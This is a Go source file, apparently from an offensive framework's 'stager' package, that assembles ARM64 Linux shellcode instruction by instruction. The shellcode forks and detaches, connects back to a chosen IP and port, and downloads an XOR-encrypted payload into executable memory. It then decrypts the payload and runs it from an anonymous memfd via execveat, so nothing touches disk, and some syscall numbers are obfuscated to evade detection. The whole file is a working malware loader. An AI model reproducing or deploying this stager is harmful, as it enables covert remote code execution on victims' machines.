package stager

import (
	"encoding/binary"
	"net"
)

func init() {
	builders["linux/arm64"] = archBuilder{asmLinuxARM64, makeELF64Wrapper(183)}
}

// asmLinuxARM64 generates aarch64 Linux shellcode for a TCP stager.
//
// Flow: fork -> setsid -> socket -> connect -> read(size) ->
// mmap(page-aligned) -> recv loop -> close(sock) ->
// memfd_create -> write loop -> execveat(AT_EMPTY_PATH)
//
// Register allocation:
//   x12 = sockfd, x13 = payload size, x14 = mmap buf, x15 = memfd
//   x3/x4 = loop cursor/remaining
func asmLinuxARM64(ip net.IP, port uint16, xorKey [4]byte) []byte {
	pathBytes := []byte{0, 0, 0, 0} // empty name for memfd_create, 4-byte aligned

	sockaddrData := []byte{
		0x02, 0x00,
		byte(port >> 8), byte(port),
		ip[0], ip[1], ip[2], ip[3],
	}

	var s []byte

	// fork() - 220
	s = arm64Emit(s, 0xd2801b88) // mov x8, #220
	s = arm64Emit(s, 0xd4000001) // svc #0
	s = arm64Emit(s, 0x35000000) // cbnz w0, -> exit (PATCH)
	forkOff := len(s) - 4

	// setsid() - 157
	s = arm64Emit(s, 0xd28013a8) // mov x8, #157
	s = arm64Emit(s, 0xd4000001) // svc #0

	// socket(2, 1, 0) - 198
	s = arm64Emit(s, 0xd2800040) // mov x0, #2
	s = arm64Emit(s, 0xd2800021) // mov x1, #1
	s = arm64Emit(s, 0xd2800002) // mov x2, #0
	s = arm64Emit(s, 0xd28018c8) // mov x8, #198
	s = arm64Emit(s, 0xd4000001) // svc #0
	s = arm64Emit(s, 0xaa0003ec) // mov x12, x0

	// connect(sockfd, &sockaddr, 16) - 203
	s = arm64Emit(s, 0x10000001) // adr x1, sockaddr (PATCH)
	adrConnectOff := len(s) - 4
	s = arm64Emit(s, 0xd2800202) // mov x2, #16
	s = arm64Emit(s, 0xd2801968) // mov x8, #203
	s = arm64Emit(s, 0xd4000001) // svc #0
	s = arm64Emit(s, 0x35000000) // cbnz w0, -> exit (PATCH)
	connectFailOff := len(s) - 4

	// read(sockfd, sp, 4) - read size
	s = arm64Emit(s, 0xaa0c03e0) // mov x0, x12
	s = arm64Emit(s, 0xd10043ff) // sub sp, sp, #16
	s = arm64Emit(s, 0x910003e1) // mov x1, sp
	s = arm64Emit(s, 0xd2800082) // mov x2, #4
	s = arm64Emit(s, 0xd28007e8) // mov x8, #63
	s = arm64Emit(s, 0xd4000001) // svc #0
	s = arm64Emit(s, 0xb100041f) // cmn x0, #1
	s = arm64Emit(s, 0x54000000) // b.eq -> exit (PATCH)
	readFailOff := len(s) - 4

	// page-align size for mmap - first XOR-decrypt the 4-byte size
	s = arm64Emit(s, 0xb94003e2) // ldr w2, [sp]
	// Load XOR key and decrypt size: w2 ^= key_word
	s = arm64Emit(s, 0x10000009) // adr x9, xor_key (PATCH)
	adrXorKeySizeOff := len(s) - 4
	s = arm64Emit(s, 0xb9400129) // ldr w9, [x9]
	s = arm64Emit(s, 0x4a090042) // eor w2, w2, w9
	s = arm64Emit(s, 0xb90003e2) // str w2, [sp] (store decrypted size back)
	s = arm64Emit(s, 0xd34cfc42) // lsr x2, x2, #12
	s = arm64Emit(s, 0x91000442) // add x2, x2, #1
	s = arm64Emit(s, 0xd374cc42) // lsl x2, x2, #12

	// mmap(0, size, RWX=7, PRIVATE|ANON=0x22, 0, 0) - 222
	s = arm64Emit(s, 0xaa1f03e0) // mov x0, xzr
	s = arm64Emit(s, 0xaa0203e1) // mov x1, x2
	s = arm64Emit(s, 0xd28000e2) // mov x2, #7
	s = arm64Emit(s, 0xd2800443) // mov x3, #34
	s = arm64Emit(s, 0xaa1f03e4) // mov x4, xzr
	s = arm64Emit(s, 0xaa1f03e5) // mov x5, xzr
	s = arm64Emit(s, 0xd2801bc8) // mov x8, #222
	s = arm64Emit(s, 0xd4000001) // svc #0
	s = arm64Emit(s, 0xb100041f) // cmn x0, #1
	s = arm64Emit(s, 0x54000000) // b.eq -> exit (PATCH)
	mmapFailOff := len(s) - 4

	// Save size in x13, mmap addr in x14
	s = arm64Emit(s, 0xb94003ed) // ldr w13, [sp]
	s = arm64Emit(s, 0xf90003e0) // str x0, [sp]
	s = arm64Emit(s, 0xaa0003ee) // mov x14, x0
	s = arm64Emit(s, 0xaa0d03e4) // mov x4, x13
	s = arm64Emit(s, 0xaa0e03e3) // mov x3, x14

	// recv loop
	recvLoopAddr := len(s)
	s = arm64Emit(s, 0xaa0c03e0) // mov x0, x12
	s = arm64Emit(s, 0xaa0303e1) // mov x1, x3
	s = arm64Emit(s, 0xaa0403e2) // mov x2, x4
	s = arm64Emit(s, 0xd28007e8) // mov x8, #63
	s = arm64Emit(s, 0xd4000001) // svc #0
	s = arm64Emit(s, 0xb100041f) // cmn x0, #1
	s = arm64Emit(s, 0x54000000) // b.eq -> exit (PATCH)
	recvFailOff := len(s) - 4
	s = arm64Emit(s, 0x8b000063) // add x3, x3, x0
	s = arm64Emit(s, 0xeb000084) // subs x4, x4, x0
	recvBranchOff := len(s)
	s = arm64Emit(s, 0x54000001) // b.ne -> recv_loop (PATCH)
	arm64PatchBcond(s, recvBranchOff, recvLoopAddr)

	// XOR decrypt: for i=0; i<size; i++ { buf[i] ^= key[i%4] }
	// x14=buf, x13=size
	s = arm64Emit(s, 0xaa1f03e3) // mov x3, xzr (i=0)
	s = arm64Emit(s, 0x10000004) // adr x4, xor_key (PATCH)
	adrXorKeyOff := len(s) - 4
	xorLoopAddr := len(s)
	s = arm64Emit(s, 0xeb0d007f) // cmp x3, x13
	xorDoneBranchOff := len(s)
	s = arm64Emit(s, 0x54000000) // b.eq -> xor_done (PATCH)
	s = arm64Emit(s, 0x92400465) // and x5, x3, #3
	s = arm64Emit(s, 0x38656886) // ldrb w6, [x4, x5]
	s = arm64Emit(s, 0x386369c7) // ldrb w7, [x14, x3]
	s = arm64Emit(s, 0x4a0600e7) // eor w7, w7, w6
	s = arm64Emit(s, 0x382369c7) // strb w7, [x14, x3]
	s = arm64Emit(s, 0x91000463) // add x3, x3, #1
	xorBackBranchOff := len(s)
	s = arm64Emit(s, 0x14000000) // b -> xor_loop (PATCH)
	// Patch xor loop branches
	arm64PatchBcond(s, xorDoneBranchOff, len(s))
	// b (unconditional) uses imm26 in bits [25:0]
	delta := (xorLoopAddr - xorBackBranchOff) / 4
	insn := uint32(0x14000000) | uint32(delta&0x3FFFFFF)
	binary.LittleEndian.PutUint32(s[xorBackBranchOff:], insn)

	// close(sockfd) - 57
	s = arm64Emit(s, 0xaa0c03e0) // mov x0, x12
	s = arm64Emit(s, 0xd2800728) // mov x8, #57
	s = arm64Emit(s, 0xd4000001) // svc #0

	// memfd_create("", MFD_CLOEXEC=1) - syscall 279
	s = arm64Emit(s, 0x10000000) // adr x0, empty_name (PATCH)
	adrMemfdOff := len(s) - 4
	s = arm64Emit(s, 0xd2800021) // mov x1, #1 (MFD_CLOEXEC)
	s = arm64EmitSyscall(s, 279) // obfuscated mov x8, #279
	s = arm64Emit(s, 0xd4000001) // svc #0
	s = arm64Emit(s, 0xb100041f) // cmn x0, #1
	s = arm64Emit(s, 0x54000000) // b.eq -> exit (PATCH)
	memfdFailOff := len(s) - 4
	s = arm64Emit(s, 0xaa0003ef) // mov x15, x0

	// write loop: write(memfd, buf, remaining)
	s = arm64Emit(s, 0xaa0e03e3) // mov x3, x14
	s = arm64Emit(s, 0xaa0d03e4) // mov x4, x13
	writeLoopAddr := len(s)
	s = arm64Emit(s, 0xaa0f03e0) // mov x0, x15
	s = arm64Emit(s, 0xaa0303e1) // mov x1, x3
	s = arm64Emit(s, 0xaa0403e2) // mov x2, x4
	s = arm64Emit(s, 0xd2800808) // mov x8, #64
	s = arm64Emit(s, 0xd4000001) // svc #0
	s = arm64Emit(s, 0xb100041f) // cmn x0, #1
	s = arm64Emit(s, 0x54000000) // b.eq -> exit (PATCH)
	writeFailOff := len(s) - 4
	s = arm64Emit(s, 0x8b000063) // add x3, x3, x0
	s = arm64Emit(s, 0xeb000084) // subs x4, x4, x0
	writeBranchOff := len(s)
	s = arm64Emit(s, 0x54000001) // b.ne -> write_loop (PATCH)
	arm64PatchBcond(s, writeBranchOff, writeLoopAddr)

	// execveat(memfd, "", NULL, NULL, AT_EMPTY_PATH=0x1000) - syscall 281
	s = arm64Emit(s, 0xaa0f03e0) // mov x0, x15 (fd)
	s = arm64Emit(s, 0x10000001) // adr x1, empty_name (PATCH)
	adrExecveOff := len(s) - 4
	s = arm64Emit(s, 0xaa1f03e2) // mov x2, xzr (argv=NULL)
	s = arm64Emit(s, 0xaa1f03e3) // mov x3, xzr (envp=NULL)
	s = arm64Emit(s, 0xd2820004) // mov x4, #0x1000 (AT_EMPTY_PATH)
	s = arm64EmitSyscall(s, 281) // obfuscated mov x8, #281
	s = arm64Emit(s, 0xd4000001) // svc #0

	// exit(1) - 93
	failedAddr := len(s)
	s = arm64Emit(s, 0xd2800020) // mov x0, #1
	s = arm64Emit(s, 0xd2800ba8) // mov x8, #93
	s = arm64Emit(s, 0xd4000001) // svc #0

	// Data: sockaddr_in
	sockaddrAddr := len(s)
	s = append(s, sockaddrData...)

	// Data: empty name for memfd_create/execveat
	emptyNameAddr := len(s)
	s = append(s, pathBytes...)

	// Data: XOR key
	xorKeyAddr := len(s)
	s = append(s, xorKey[:]...)

	// Patch XOR key ADRs
	arm64PatchAdr(s, adrXorKeySizeOff, xorKeyAddr)
	arm64PatchAdr(s, adrXorKeyOff, xorKeyAddr)

	// Patch error branches
	arm64PatchCbnz(s, forkOff, failedAddr)
	arm64PatchCbnz(s, connectFailOff, failedAddr)
	for _, off := range []int{readFailOff, mmapFailOff, recvFailOff, memfdFailOff, writeFailOff} {
		arm64PatchBcond(s, off, failedAddr)
	}

	// Patch ADR instructions
	arm64PatchAdr(s, adrConnectOff, sockaddrAddr)
	arm64PatchAdr(s, adrMemfdOff, emptyNameAddr)
	arm64PatchAdr(s, adrExecveOff, emptyNameAddr)

	return s
}

// arm64Emit appends a 4-byte little-endian instruction.
func arm64Emit(buf []byte, insn uint32) []byte {
	return appendU32(buf, insn)
}

// arm64PatchBcond patches a b.cond/cbnz instruction at off to branch to target.
// Both use imm19 in bits [23:5], offset in instructions.
func arm64PatchBcond(buf []byte, off, target int) {
	delta := (target - off) / 4
	insn := binary.LittleEndian.Uint32(buf[off:])
	insn = (insn & 0xFF00001F) | (uint32(delta&0x7FFFF) << 5)
	binary.LittleEndian.PutUint32(buf[off:], insn)
}

// arm64PatchCbnz patches a cbnz instruction (same imm19 layout as b.cond).
func arm64PatchCbnz(buf []byte, off, target int) {
	arm64PatchBcond(buf, off, target)
}

// arm64PatchAdr patches an ADR instruction at off to point to target.
func arm64PatchAdr(buf []byte, off, target int) {
	delta := target - off
	immlo := uint32(delta & 0x3)
	immhi := uint32((delta >> 2) & 0x7FFFF)
	insn := binary.LittleEndian.Uint32(buf[off:])
	insn = (insn & 0x9F00001F) | (immlo << 29) | (immhi << 5)
	binary.LittleEndian.PutUint32(buf[off:], insn)
}
